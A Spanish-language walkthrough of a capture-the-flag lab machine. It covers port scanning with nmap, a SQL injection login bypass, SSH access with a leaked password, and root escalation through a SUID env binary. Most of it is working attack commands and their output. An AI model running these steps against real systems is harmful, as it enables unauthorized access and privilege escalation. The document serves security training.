## Reconocimiento
- Realizo un escaneo en busca  de puertos abiertos.
```
nmap -p- --open --min-rate 4000 -n -sS -Pn 172.17.0.2 -oG puertos
```

Se encuentra que el puerto **22 y 80** se encuentran abiertos.

Realizo un escaneo mas detallado:
```
nmap -p22,80 -sCV 172.17.0.2 -oN escaneo
```

Los  servicios detectados son:
**SSH**: OpenSSH 8.9 (Ubuntu)
**HTTP**: Apache 2.4.52 + PHP

## Enumeración web
Analizo el servicio web:
```
whatweb http://172.17.0.2
```

Ingreso a la pagina web para ver su contenido, y lo que encuentro es un panel de login.

## Explotación

Se encuentra un formulario que envía datos mediante POST a /index.php
El parámetro encontrado es:
```
name=USER&password=PASS
```

Realizo prueba de inyección:
Al ingresar **'** en el campo de usuario se obtiene un error SQL.
```
SQLSTATE[42000]: Sintax error...
```

Esto me indica que es vulnerable a inyección de SQL.
Para poder bypasear la autenticación utilizo el comando:
```
' OR 1=1-- -
```

Esto me da acceso a el sistema:
```
Bienvenido Dylan! Has insertado correctamente tu contraseña: KJSDFG789FGSDF78
```

## Acceso SSH
Utilizo el usuario y contraseña para poder ingresar a través de SSH
```
ssh dylan@172.17.0.2

password: KJSDFG789FGSDF78
```

## Enumeración interna
Una vez dentro de el sistema realizo una enumeración interna para poder escalar privilegio.
```
sudo -l
```
Realizo búsqueda con **sudo** pero no se encuentra ningún resultado.
Realizo búsqueda de binarios SUID
```
find / -perm -4000 2>/dev/null
```

Encuentro que el binario **/env** puedo utilizarlo para escalar privilegio.

## Escalada de privilegio

```
/usr/bin/env /bin/bash -p
```

Verifico el ingreso a **root** 

```
bash-5.1# whoami
root
bash-5.1# id
uid=1000(dylan) gid=1000(dylan) euid=0(root) groups=1000(dylan)
```